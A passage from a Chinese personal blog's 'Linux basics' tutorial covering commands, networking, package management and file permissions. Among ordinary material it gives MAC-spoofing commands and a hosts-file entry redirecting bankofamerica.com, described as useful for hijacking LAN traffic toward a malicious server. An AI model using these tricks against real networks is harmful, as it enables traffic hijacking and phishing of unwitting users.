            <span class="post-date" title="2020-07-26 10:44:00">2020/07/26</span>
        </a>
        
        <a  class="密码小屋 Knapsack "
           href="/2020/06/08/密码学学习笔记之knapsack/"
           data-tag="Knapsack"
           data-author="Van1sh" >
            <span class="post-title" title="密码学学习笔记 之 knapsack">密码学学习笔记 之 knapsack</span>
            <span class="post-date" title="2020-06-08 10:30:43">2020/06/08</span>
        </a>
        
        <a  class="比赛小屋 "
           href="/2020/05/26/2020BJD3rd/"
           data-tag="Write Up"
           data-author="Van1sh &amp; FzWjScJ" >
            <span class="post-title" title="2020 BJD3rd">2020 BJD3rd</span>
            <span class="post-date" title="2020-05-26 16:00:47">2020/05/26</span>
        </a>
        
        <a  class="比赛小屋 "
           href="/2020/05/24/2020GKCTF/"
           data-tag="Write Up"
           data-author="Van1sh" >
            <span class="post-title" title="2020 GKCTF">2020 GKCTF</span>
            <span class="post-date" title="2020-05-24 17:05:00">2020/05/24</span>
        </a>
        
        <a  class="工具小屋 "
           href="/2020/05/20/sage常用命令/"
           data-tag="Sage"
           data-author="Van1sh" >
            <span class="post-title" title="sage常用命令">sage常用命令</span>
            <span class="post-date" title="2020-05-20 11:22:00">2020/05/20</span>
        </a>
        
        <a  class="密码小屋 Paillier "
           href="/2020/05/14/密码学学习笔记之paillier cryptosystem/"
           data-tag="Paillier"
           data-author="Van1sh" >
            <span class="post-title" title="密码学学习笔记 之 paillier cryptosystem">密码学学习笔记 之 paillier cryptosystem</span>
            <span class="post-date" title="2020-05-14 11:00:19">2020/05/14</span>
        </a>
        
        <a  class="密码小屋 Lattice "
           href="/2020/05/12/密码学学习笔记之HNP/"
           data-tag="Lattice,Dsa,LCG"
           data-author="Van1sh" >
            <span class="post-title" title="密码学学习笔记 之 HNP">密码学学习笔记 之 HNP</span>
            <span class="post-date" title="2020-05-12 10:00:57">2020/05/12</span>
        </a>
        
        <a  class="比赛小屋 "
           href="/2020/05/10/2020网鼎杯/"
           data-tag="Write Up"
           data-author="Van1sh" >
            <span class="post-title" title="2020 网鼎杯">2020 网鼎杯</span>
            <span class="post-date" title="2020-05-10 21:15:00">2020/05/10</span>
        </a>
        
        <a  class="密码小屋 ECC "
           href="/2020/05/07/密码学学习笔记之NCCIP/"
           data-tag="ECC"
           data-author="Van1sh" >
            <span class="post-title" title="密码学学习笔记 之 NCCIP">密码学学习笔记 之 NCCIP</span>
            <span class="post-date" title="2020-05-07 10:30:43">2020/05/07</span>
        </a>
        
        <a  class="比赛小屋 "
           href="/2020/05/05/2020De1CTF/"
           data-tag="Write Up"
           data-author="Van1sh" >
            <span class="post-title" title="2020 De1CTF">2020 De1CTF</span>
            <span class="post-date" title="2020-05-05 15:57:00">2020/05/05</span>
        </a>
        
        <a  class="密码小屋 Block "
           href="/2020/03/03/密码学学习笔记之分组密码操作模式/"
           data-tag="操作模式"
           data-author="Van1sh" >
            <span class="post-title" title="密码学学习笔记 之 分组密码操作模式">密码学学习笔记 之 分组密码操作模式</span>
            <span class="post-date" title="2020-03-03 15:15:00">2020/03/03</span>
        </a>
        
        <a  class="比赛小屋 "
           href="/2020/02/18/2020hgame_week1/"
           data-tag="Write Up"
           data-author="Van1sh" >
            <span class="post-title" title="2020 hgame week1">2020 hgame week1</span>
            <span class="post-date" title="2020-02-18 16:22:35">2020/02/18</span>
        </a>
        
        <a  class="密码小屋 Stream "
           href="/2020/01/30/密码学学习笔记之RC4与SM4/"
           data-tag="Rc4,SM4"
           data-author="Van1sh" >
            <span class="post-title" title="密码学学习笔记 之 RC4与SM4">密码学学习笔记 之 RC4与SM4</span>
            <span class="post-date" title="2020-01-30 00:05:00">2020/01/30</span>
        </a>
        
        <a  class="密码小屋 Rsa "
           href="/2019/12/04/密码学学习笔记之浅析On r-th Root Extraction Algorithm in Fq/"
           data-tag="Rsa"
           data-author="Van1sh" >
            <span class="post-title" title="密码学学习笔记 之 浅析On r-th Root Extraction Algorithm in Fq">密码学学习笔记 之 浅析On r-th Root Extraction Algorithm in Fq</span>
            <span class="post-date" title="2019-12-04 14:30:46">2019/12/04</span>
        </a>
        
        <a  class="密码小屋 Basic "
           href="/2019/12/03/密码学学习笔记之数论四大定理及应用/"
           data-tag="number theory,Abstract algebra"
           data-author="Van1sh" >
            <span class="post-title" title="密码学学习笔记 之 数论四大定理及应用">密码学学习笔记 之 数论四大定理及应用</span>
            <span class="post-date" title="2019-12-03 15:30:25">2019/12/03</span>
        </a>
        
        <a  class="密码小屋 Rsa "
           href="/2019/11/11/密码学学习笔记之浅析Pollard's rho algorithm及其应用/"
           data-tag="Rsa"
           data-author="Van1sh" >
            <span class="post-title" title="密码学学习笔记 之 浅析Pollard&#39;s rho algorithm及其应用">密码学学习笔记 之 浅析Pollard&#39;s rho algorithm及其应用</span>
            <span class="post-date" title="2019-11-11 15:32:00">2019/11/11</span>
        </a>
        
        <a  class="比赛小屋 "
           href="/2019/11/08/2019UNCTF/"
           data-tag="Write Up"
           data-author="Van1sh" >
            <span class="post-title" title="2019 UNCTF">2019 UNCTF</span>
            <span class="post-date" title="2019-11-08 11:30:30">2019/11/08</span>
        </a>
        
        <a  class="工具小屋 "
           href="/2019/11/01/docker和docker-compose的安装/"
           data-tag="docker"
           data-author="Van1sh" >
            <span class="post-title" title="安装Docker 和 Docker-Compose以及docker images的制作及上传">安装Docker 和 Docker-Compose以及docker images的制作及上传</span>
            <span class="post-date" title="2019-11-01 21:00:00">2019/11/01</span>
        </a>
        
        <a  class="工具小屋 "
           href="/2019/09/12/Linux 基础/"
           data-tag="Linux"
           data-author="Vanish" >
            <span class="post-title" title="Linux 基础">Linux 基础</span>
            <span class="post-date" title="2019-09-12 00:17:00">2019/09/12</span>
        </a>
        
        <a  class="比赛小屋 "
           href="/2019/08/29/2019第五空间/"
           data-tag="Write Up"
           data-author="Van1sh" >
            <span class="post-title" title="2019 第五空间">2019 第五空间</span>
            <span class="post-date" title="2019-08-29 12:18:35">2019/08/29</span>
        </a>
        
        <a  class="比赛小屋 "
           href="/2019/08/27/2019OGeek/"
           data-tag="Write Up"
           data-author="Van1sh" >
            <span class="post-title" title="2019 OGeek">2019 OGeek</span>
            <span class="post-date" title="2019-08-27 11:02:35">2019/08/27</span>
        </a>
        
        <a  class="比赛小屋 "
           href="/2019/08/03/2019De1CTF/"
           data-tag="Write Up"
           data-author="Van1sh" >
            <span class="post-title" title="2019 De1CTF">2019 De1CTF</span>
            <span class="post-date" title="2019-08-03 22:14:55">2019/08/03</span>
        </a>
        
        <a  class="小书屋 "
           href="/2019/08/02/三体/"
           data-tag="book"
           data-author="Van1sh" >
            <span class="post-title" title="三体">三体</span>
            <span class="post-date" title="2019-08-02 12:56:00">2019/08/02</span>
        </a>
        
        <a  class="工具小屋 "
           href="/2019/07/22/nmap/"
           data-tag="Nmap"
           data-author="Van1sh" >
            <span class="post-title" title="初遇Nmap">初遇Nmap</span>
            <span class="post-date" title="2019-07-22 16:07:55">2019/07/22</span>
        </a>
        
        <a  class="工具小屋 "
           href="/2019/07/21/python 正则/"
           data-tag="python"
           data-author="Van1sh" >
            <span class="post-title" title="python 之 正则">python 之 正则</span>
            <span class="post-date" title="2019-07-21 22:30:35">2019/07/21</span>
        </a>
        
        <a  class="比赛小屋 "
           href="/2019/07/15/2019赛博杯/"
           data-tag="Write Up"
           data-author="Van1sh" >
            <span class="post-title" title="2019 赛博杯">2019 赛博杯</span>
            <span class="post-date" title="2019-07-15 16:22:35">2019/07/15</span>
        </a>
        
    </nav>
</div>
    </div>
    <div class="hide-list">
        <div class="semicircle">
            <div class="brackets first"><</div>
            <div class="brackets">&gt;</div>
        </div>
    </div>
</aside>
<div class="post">
    <div class="pjax">
        <article id="post-Linux 基础" class="article article-type-post" itemscope itemprop="blogPost">
    
        <h1 class="article-title">Linux 基础</h1>
    
    <div class="article-meta">
        
        
        <span class="author"><a>Vanish</a></span>
        
        
        <span class="book">
            
                <a  data-rel="工具小屋">工具小屋</a>
            
        </span>
        
        
        <span class="tag">
            
            <a class="color1">Linux</a>
            
        </span>
        
    </div>
    <div class="article-meta">
        
        创建时间:<time class="date" title='更新时间: 2020-05-24 18:37:18'>2019-09-12 00:17</time>
        
    </div>
    <div class="article-meta">
        
        <span>字数:11.6k</span>
        
        
        <span id="busuanzi_container_page_pv">
            阅读:<span id="busuanzi_value_page_pv">
                <span class="count-comment">
                    <span class="spinner">
                      <div class="cube1"></div>
                      <div class="cube2"></div>
                    </span>
                </span>
            </span>
        </span>
        
        
    </div>
    
    <div class="toc-ref">
    
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux-文件系统"><span class="toc-text">Linux 文件系统</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux基本命令"><span class="toc-text">Linux基本命令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#搜索查找"><span class="toc-text">搜索查找</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#分析和管理网络"><span class="toc-text">分析和管理网络</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ifconfig"><span class="toc-text">ifconfig</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#iwconfig"><span class="toc-text">iwconfig</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#更改你的网络信息"><span class="toc-text">更改你的网络信息</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#添加或删除软件"><span class="toc-text">添加或删除软件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#控制文件和目录权限"><span class="toc-text">控制文件和目录权限</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#权限："><span class="toc-text">权限：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#检查权限-ls-l"><span class="toc-text">检查权限    ls -l</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UGO语法："><span class="toc-text">UGO语法：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#umask"><span class="toc-text">umask</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#特别权限："><span class="toc-text">特别权限：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#使用-SUID授予临时-root权限"><span class="toc-text">使用 SUID授予临时 root权限</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#使用-SGID授予-Root用户组权限"><span class="toc-text">使用 SGID授予 Root用户组权限</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#提权"><span class="toc-text">提权</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#进程管理"><span class="toc-text">进程管理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ps"><span class="toc-text">ps</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#top"><span class="toc-text">top</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nice"><span class="toc-text">nice</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#renice"><span class="toc-text">renice</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#kill"><span class="toc-text">kill</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#在后台运行进程"><span class="toc-text">在后台运行进程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#把后台运行的进程移到前台"><span class="toc-text">把后台运行的进程移到前台</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#定时执行程序"><span class="toc-text">定时执行程序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#管理用户环境变量"><span class="toc-text">管理用户环境变量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#添加到PATH变量"><span class="toc-text">添加到PATH变量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#创建用户定义的变量"><span class="toc-text">创建用户定义的变量</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#简单BASH-脚本编程"><span class="toc-text">简单BASH 脚本编程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#一个简单的扫描器"><span class="toc-text">一个简单的扫描器</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#注：这里只对bash进行简单的介绍。"><span class="toc-text">注：这里只对bash进行简单的介绍。</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#压缩和归档"><span class="toc-text">压缩和归档</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#归档"><span class="toc-text">归档</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#压缩"><span class="toc-text">压缩</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#创建存储设备的逐位或物理副本"><span class="toc-text">创建存储设备的逐位或物理副本</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#文件系统和存储设备管理"><span class="toc-text">文件系统和存储设备管理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#设备目录-DEV"><span class="toc-text">设备目录/DEV</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#字符和块设备"><span class="toc-text">字符和块设备</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#使用-lsblk列出-块设备和信息"><span class="toc-text">使用 lsblk列出 块设备和信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#自己安装存储设备"><span class="toc-text">自己安装存储设备</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#卸载与-umount"><span class="toc-text">卸载与 umount</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#获取挂载磁盘上的信息"><span class="toc-text">获取挂载磁盘上的信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#检查错误"><span class="toc-text">检查错误</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#日志系统"><span class="toc-text">日志系统</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#rsyslog日志记录规则"><span class="toc-text">rsyslog日志记录规则</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#使用-LOGROTATE-自动清理日志"><span class="toc-text">使用 LOGROTATE 自动清理日志</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#删除证据"><span class="toc-text">删除证据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#禁用日志记录"><span class="toc-text">禁用日志记录</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#熟练使用服务"><span class="toc-text">熟练使用服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#使用作业调度自动化任务"><span class="toc-text">使用作业调度自动化任务</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#设置一个备份计划任务"><span class="toc-text">设置一个备份计划任务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#crontab快捷方式"><span class="toc-text">crontab快捷方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#使用-RC-脚本开机运行任务"><span class="toc-text">使用 RC 脚本开机运行任务</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PYTHON-网络通信"><span class="toc-text">PYTHON 网络通信</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#创建-TCP-监听器"><span class="toc-text">创建 TCP 监听器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#密码破解"><span class="toc-text">密码破解</span></a></li></ol></li></ol>
    
<style>
    .left-col .switch-btn,
    .left-col .switch-area {
        display: none;
    }
    .toc-level-3 i,
    .toc-level-3 ol {
        display: none !important;
    }
</style>
</div>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="Linux-文件系统"><a href="#Linux-文件系统" class="headerlink" title="Linux 文件系统"></a>Linux 文件系统</h2><p>逻辑文件系统</p>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">文件系统的根（/）位于文件系统目录树的顶部，以下是要了解的最重要的子目录： </span><br><span class="line"><span class="string">/root</span> root 用户的主目录 </span><br><span class="line"><span class="string">/etc</span> 通常包含 Linux 配置文件 - 控制程序启动时间和方式的文件 </span><br><span class="line"><span class="string">/home</span> 用户的主目录 </span><br><span class="line"><span class="string">/mnt</span> 将其他文件系统附加或安装到文件系统的位置 </span><br><span class="line"><span class="string">/media</span> CD 和 USB 设备通常连接或安装到文件系统的位置 </span><br><span class="line"><span class="string">/bin</span> 其中包含应用程序二进制文件（相当于 Microsoft Windows 中的可执行文件） </span><br><span class="line"><span class="string">/lib</span> lib 库文件（与 Windows DLL 类似的共享程序）</span><br></pre></td></tr></table></figure>

<h2 id="Linux基本命令"><a href="#Linux基本命令" class="headerlink" title="Linux基本命令"></a>Linux基本命令</h2><p>pwd    查看当前目录</p>
<p>whoami    查看登录用户</p>
<p>cd    更改目录</p>
<p>ls    列出目录内容</p>
<p>ls -l    列出目录输出为长列表</p>
<p>ls -a（ls -la）列出内容包括隐藏文件、</p>
<p>sth - help    获取帮助</p>
<p>man sth    使用man引用手册页</p>
<h3 id="搜索查找"><a href="#搜索查找" class="headerlink" title="搜索查找"></a>搜索查找</h3><p>locate sth    此命令将遍历整个 文件系统并找到该单词的每个匹配项。 </p>
<p>whereis sth    此命令不仅返回二进制文件的位置，还返 回其源和手册页（如果可用）。</p>
<p>which sth    在PATH变量中查找二进制文件</p>
<p>find：</p>
<p>​        语法：find directory options expression </p>
<p>​        例：find / -type f -name apache2.*            (f表示普通文件)</p>
<p>ps aux    提供了在这个系统中运行的所有进程的列表 </p>
<p>grep 过滤关键字（配合管道符）</p>
<p>cat    显示文件</p>
<p>cat &gt;    创建小文件（CTRL-D保存）</p>
<p>cat &gt;&gt;    附加</p>
<p>touch filename    创建名为filename的文件</p>
<p>mkdir \dirname    创建目录</p>
<p>cp oldfilename path/newfilename    复制文件</p>
<p>mv oldfile newfile    迂回重命名文件</p>
<p>rm filename    删除文件</p>
<p>rmdir dirname    删除空目录</p>
<p>rm -r dirname    删除目录及文件</p>
<p>head filename    查看开头前（默认）十行</p>
<p>head -20 filename    查看开头前20行</p>
<p>tail filename    同head，查看文件尾</p>
<p>nl filename    显示行号</p>
<p>例：tail  -n+507  /etc/snort/snort.conf  |  head  -n  6</p>
<p>sed  查找和替换</p>
<p>例：sed    s/mysql/MySQL/g  /etc/snort/snort.conf  &gt;  snort2.conf</p>
<p>s 参数提供搜索，你先提供想要搜索的关键词 (mysql) 然后提供想要替换成的关键词 (MySQL), 用斜杠 (/)分开。g 参数告诉 Linux 你希望全局替换，然后将结果保存到一个新文件 snort2.conf。 </p>
<p>如果你只想替换第一个出现的 mysql，你需要去掉末尾的 g 参数。 </p>
<p>你也可以使用 sed 命令查找替换第一个出现字段以外的任意位置出现的字段。例如，如果你想只替换 第二个出现的 mysql，</p>
<p>sed  s/mysql/MySQL/2  snort.conf  &gt;  snort2.conf </p>
<p>more filename    控制显示文件    enter键换行</p>
<p>less filename    按下斜杠键（/）， 输入（output），这会立即将你带到第一个出现 output 的地方，并且高亮了 output。然后你可以按 n 键（next）到下一 个出现 （output ）的地方。 </p>
<h2 id="分析和管理网络"><a href="#分析和管理网络" class="headerlink" title="分析和管理网络"></a>分析和管理网络</h2><h3 id="ifconfig"><a href="#ifconfig" class="headerlink" title="ifconfig"></a>ifconfig</h3><p>eth0（Ethernet0）第一个有线以太网接口</p>
<p>Ethernet     以太网</p>
<p>HWaddr    每个网络硬件上标记的全局唯一标记，在这种情况下，网络接口卡 network interface card (NIC), 通常指的是媒体访问控制 media access control (MAC) 地址。 </p>
<p>inet addr    分配IP地址信息的网络接口     </p>
<p>Bcast    广播地址，用于向子网上的所有 IP 发送信息的地址;</p>
<p>Mask    子网掩码，用于确定 IP 地 址的哪个部分连接到本地网络</p>
<p>lo     环回地址（loopback address）    并且有时称为 localhost    这是个特殊的软件地址，可帮助你连接到自己的系统。未在系统上运行的软件和服务将 无法被使用。你可以使用 lo 在你的系统测试某些内容，例如你自己的 web 服务器。本地主机通常用 IP 地 址 127.0.0.1 表示。 </p>
<p>wlan0    只有当拥有无线接口或适配器时，才会出现这种情况。请注意，它还 会显示该设备 (HWaddr)的 MAC 地址。 </p>
<p>来自 ifconfig 的此信息使您可以连接并操作局域网 (LAN) 设置，这是黑客攻击的基本技能（内网穿透么？）</p>
<h3 id="iwconfig"><a href="#iwconfig" class="headerlink" title="iwconfig"></a>iwconfig</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kali &gt;iwconfig </span><br><span class="line">wlan0 IEEE 802.11bg ESSID:off/any </span><br><span class="line">Mode:Managed Access Point: <span class="keyword">Not</span> Associated <span class="attribute">Tx-Power</span>=20 dBm </span><br><span class="line">­­snip-- </span><br><span class="line">lo <span class="literal">no</span><span class="built_in"> wireless </span>extensions  </span><br><span class="line">eth0 <span class="literal">no</span><span class="built_in"> wireless </span>extensions</span><br></pre></td></tr></table></figure>

<p>对于 wlan0，我们了解了我们的设备能够支持的 802.11 IEEE 无线标准：b 和 g ， 两种早期的无线通 信标准。现在大多数无线设备也包括 n ( n 是最新的标准)。 </p>
<p>我们还从 iwconfig 中学习了无线扩展的模式(本例中为 Mode:Manage，不同于 monitor 或 promiscuous mode)。在破解无线密码时，我们需要使用到混杂模式(promiscuous mode)。 </p>
<p>接下来，我们将看到无线网卡（适配器）未连接（未关联）到接入点 (AP) ，并且其功率为 20 dBm， 这表示信号强度。 </p>
<h3 id="更改你的网络信息"><a href="#更改你的网络信息" class="headerlink" title="更改你的网络信息"></a>更改你的网络信息</h3><p>ifconfig  eth0  192.168.181.115  netmask  255.255.0.0  broadcast  192.168.1.255     </p>
<p>使用 ifconfig 命令改变你的IP，子网掩码，广播地址</p>
<p>伪装MAC（ HWaddr ）地址：</p>
<p>​        简单地使用 ifconfig 命令的 down 选项来关闭该接口 </p>
<p>​        然后输入 ifconfig 命令并加上接口名称 (hw 表示硬件，ether 表示以太网) 和新的伪造 MAC 地 </p>
<p>​        最后，使用选项 up 备份接口以进行更改。 </p>
<p>例：</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">kali</span> &gt;<span class="selector-tag">ifconfig</span>  <span class="selector-tag">eth0</span>  <span class="selector-tag">down</span> </span><br><span class="line"><span class="selector-tag">kali</span> &gt;<span class="selector-tag">ifconfig</span>  <span class="selector-tag">eth0</span>  <span class="selector-tag">hw</span>  <span class="selector-tag">ether</span>  00<span class="selector-pseudo">:11</span><span class="selector-pseudo">:22</span><span class="selector-pseudo">:33</span><span class="selector-pseudo">:44</span><span class="selector-pseudo">:55</span> </span><br><span class="line"><span class="selector-tag">kali</span> &gt;<span class="selector-tag">ifconfig</span>  <span class="selector-tag">eth0</span>  <span class="selector-tag">up</span></span><br></pre></td></tr></table></figure>

<p>dhclient  eth0     从 DHCP服务器分配新的 IP地址</p>
<p>dig hackers-arise.com ns    (nameserver 的缩写）从一个域名服务器获取信息 </p>
<p>在 ADDITIONAL SECTION 部分，dig 查询显示了为 hackers­arise.com 提供服务的 DNS 服务 器的 IP 地址</p>
<p>dig hackers-arise.com mx    获取电子邮件服务器信息</p>
<p>更改DNS服务器</p>
<p>leafpad  /etc/resolv.conf         然后文中添加    nameserver 8.8.8.8 </p>
<p>or</p>
<p>echo  “nameserver  8.8.8.8”  &gt;&gt;  /etc/resolv.conf </p>
<p>（你的机器现在将转到 Google 公共 DNS 服务器来解析域名成 IP 地址。）</p>
<p>映射您自己的IP地址（你可以决定浏览器将访问哪个 IP 地址而不是让 DNS 服务决定）</p>
<p><strong>对于黑客，这对于劫持局域网上的 TCP 连接以使用 dnsspoof 等工具将流量定向到恶意 Web 服务 器非常有用。</strong> </p>
<p>192.168.181.131    bankofamerica.com （在 IP 地址和域名中间请确保你输入的是 TAB 键）</p>
<h2 id="添加或删除软件"><a href="#添加或删除软件" class="headerlink" title="添加或删除软件"></a>添加或删除软件</h2><p>apt-cache search [snort]     搜索软件包</p>
<p>apt-get  install  [snort]    添加软件</p>
<p>apt-get  remove  [snort]    删除软件    （不删除配置文件）</p>
<p>apt-get purge [snort ]    删除软件及其配置文件</p>
<p>apt-get update     更新系统</p>
<p>apt-get upgrade     升级库中的包</p>
<p>​            添加软件仓库到 SOURCES.LIST 文件 ：</p>
<p>​            kali &gt;leafpad  /etc/apt/sources.list </p>
<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">deb <span class="string">http:</span><span class="comment">//ppa.launchpad.net/webupd8team/java/ubuntu trusty main  </span></span><br><span class="line">deb-src <span class="string">http:</span><span class="comment">//ppa.launchpad.net/webupd8team/java/ubuntu precise main</span></span><br></pre></td></tr></table></figure>

<p>​            其中</p>
<p>​            main     包含受支持的开源软件<br>​            universe     包含社区维护的开源软件<br>​            multiverse     包含受版权或其他法律问题限制的软件<br>​            restricted     包含专有设备驱动程序<br>​            backports     包含来自后续版本的</p>
<p> git clone url</p>
<h2 id="控制文件和目录权限"><a href="#控制文件和目录权限" class="headerlink" title="控制文件和目录权限"></a>控制文件和目录权限</h2><h3 id="权限："><a href="#权限：" class="headerlink" title="权限："></a>权限：</h3><p>必须为每个文件和目录分配使用它的不同身份的特定级别的权限。三个级别的许可如下： </p>
<p>r   读权限。赋予用户打开与查看权限<br>w  写权限。赋予用户查看与编辑写入权限<br>x  执行权限。赋予用户执行一个文件（但是没有必要查看或者编辑它）</p>
<p>通过这种方式，root 用户可以根据用户需要的权限向用户授予一定级别的权限。创建文件时，通常创 建文件的用户是文件的所有者，用户组是用户的当前组。该文件的所有者可以授予它各种访问权限。让我 们看看如何更改权限以将所有权赋予给单个用户和组。 </p>
<p>chown user filename    赋予个人用户权限</p>
<p>chgrp group filename    赋予用户组权限</p>
<h3 id="检查权限-ls-l"><a href="#检查权限-ls-l" class="headerlink" title="检查权限    ls -l"></a>检查权限    ls -l</h3><p>例：</p>
<figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">kali &gt;ls  –l  /usr/share/hashcat </span><br><span class="line">total<span class="number"> 32952 </span></span><br><span class="line">➊➋         ➌  ➍  ➎ ➏           ➐ </span><br><span class="line">drwxr-xr-x <span class="number"> 5 </span> root  root<span class="number"> 4096 </span>Dec<span class="number"> 5 </span>10:47 charsets </span><br><span class="line">­rw-r--r-- <span class="number"> 1 </span> root  root<span class="number"> 33685504 </span>June<span class="number"> 28 </span>2018 hashcat.hcstat </span><br><span class="line">­rw-r--r-- <span class="number"> 1 </span> root  root<span class="number"> 33685504 </span>June<span class="number"> 28 </span>2018 hashcat.hctune </span><br><span class="line">drwxr -xr-x<span class="number"> 2 </span> root  root<span class="number"> 4096 </span>Dec<span class="number"> 5 </span>10:47 masks </span><br><span class="line">drwxr -xr-x<span class="number"> 2 </span> root  root<span class="number"> 4096 </span>Dec<span class="number"> 5 </span>10:47 OpenCL </span><br><span class="line">drwxr -xr-x<span class="number"> 3 </span> root  root<span class="number"> 4096 </span>Dec<span class="number"> 5 </span>10:47 rules</span><br></pre></td></tr></table></figure>

<p>第一个字符告诉您文件类型，其中 d 代表目录，短划线（ - ）表示文件。<br>下一节定义文件的权限。有三组 三个 字符，由 read（r）， write（w）和 execute（x）的某种组合按顺 序组成。</p>
<p>第一组代表所有者的权限，第二组代表用户所在组的权限以及最后一个，所有其他用户的权限。 </p>
<p>无论您正在查看哪一组三个字母，如果您首先看到 r，该用户或用户组都有权打开和读取该文件或目录。 作为中间字母的 w 意味着它们可以写入（修改）文件或目录，并且最后的 x 意味着它们可以执行（或运行） 文件或目录。如果用短划线（ - ）替换任何 r，w 或 x，则未给出相应的权限。</p>
<table>
<thead>
<tr>
<th>二进制</th>
<th>十进制</th>
<th>权限(rwx)</th>
</tr>
</thead>
<tbody><tr>
<td>000</td>
<td>0</td>
<td>—</td>
</tr>
<tr>
<td>001</td>
<td>1</td>
<td>–x</td>
</tr>
<tr>
<td>010</td>
<td>2</td>
<td>-w-</td>
</tr>
<tr>
<td>011</td>
<td>3</td>
<td>-wx</td>
</tr>
<tr>
<td>100</td>
<td>4</td>
<td>r–</td>
</tr>
<tr>
<td>101</td>
<td>5</td>
<td>r-x</td>
</tr>
<tr>
<td>110</td>
<td>6</td>
<td>rw-</td>
</tr>
<tr>
<td>111</td>
<td>7</td>
<td>rwx</td>
</tr>
</tbody></table>
<p>chmod  774  hashcat.hcsta    更改文件权限（7 文件所有者权限  7 文件所有者所在组权限 4其他所有用户权限 ）</p>
<h3 id="UGO语法："><a href="#UGO语法：" class="headerlink" title="UGO语法："></a>UGO语法：</h3><p>输入 chmod 命令，然后输入要更改权限的用户，为用户提供 u，为组提供 g，为 其他用户提供 o，或者输入三个运算符之一： </p>
<p>-     移除一个权限 </p>
<p>+    添加一个权限 </p>
<p>=    设置一个权限 </p>
<p>在操作符之后，包括要添加或删除的权限（rwx），最后包含要应用它的文件的名称。 </p>
<p>例：</p>
<p>chmod  u-w  hashcat.hcstat         删除用户对 hashcat.hcstat 所属文件的写入权限</p>
